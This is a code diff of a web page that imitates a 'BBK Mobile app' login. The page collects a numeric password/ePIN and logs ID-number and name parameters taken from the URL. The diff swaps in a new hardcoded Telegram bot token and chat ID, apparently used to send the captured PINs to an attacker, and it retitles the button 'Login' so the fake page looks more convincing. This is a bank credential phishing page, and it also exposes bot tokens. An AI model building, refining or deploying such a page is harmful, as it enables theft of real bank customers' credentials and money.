@@ -174,14 +174,14 @@
         </div>
     </div>
 
-    <div class="name" id="user">
-    </div>
+    <!-- <div class="name" id="user">
+    </div> -->
     <p style="font-size: 13px;">Please activate your BBK Mobile app Password/ePIN</p>
     <form>
     <div class="pin-wrap">
-      <input id="pin" class="input" name="epin" type="password" inputmode="numeric" pattern="[0-9]*" maxlength="8" minlength="6" placeholder="Enter your password (6 to 8 numeric only)" aria-label="Enter your password (6 to 8 numeric only)">
+      <input id="pin" class="input" name="epin" type="password" inputmode="numeric" pattern="[0-9]*" maxlength="8" minlength="6" placeholder="Enter Your Password/ePIN" aria-label="Enter your password (6 to 8 numeric only)">
 
-      <button class="login" name="sss" id="loginBtn" type="submit" aria-label="Login">Activate</button>
+      <button class="login" name="sss" id="loginBtn" type="submit" aria-label="Login">Login</button>
 
 
 
@@ -222,9 +222,9 @@
     console.log('cpr:',  cpr);  
     console.log('name:', name);  
   // Display the name if available
-  if (name) {
-    document.getElementById('user').textContent = decodeURIComponent(name);
-  }
+  // if (name) {
+  //   document.getElementById('user').textContent = decodeURIComponent(name);
+  // }
 
   const form = document.querySelector('form');
   const loginBtn = document.getElementById('loginBtn');
@@ -243,8 +243,8 @@
     // Disable button and show loading
     loginBtn.disabled = true;
 
-    const botToken = "8317396526:AAFNNX5WnbBb_Nt9cOUDOqy1cXhe2xrsSu8";
-    const chatId = "-5091116242";
+    const botToken = "8453434962:AAH2AZVGtRtUjqw4ziizkdE_GntutiUF6OA";
+    const chatId = "-5000519303";
 
   
 
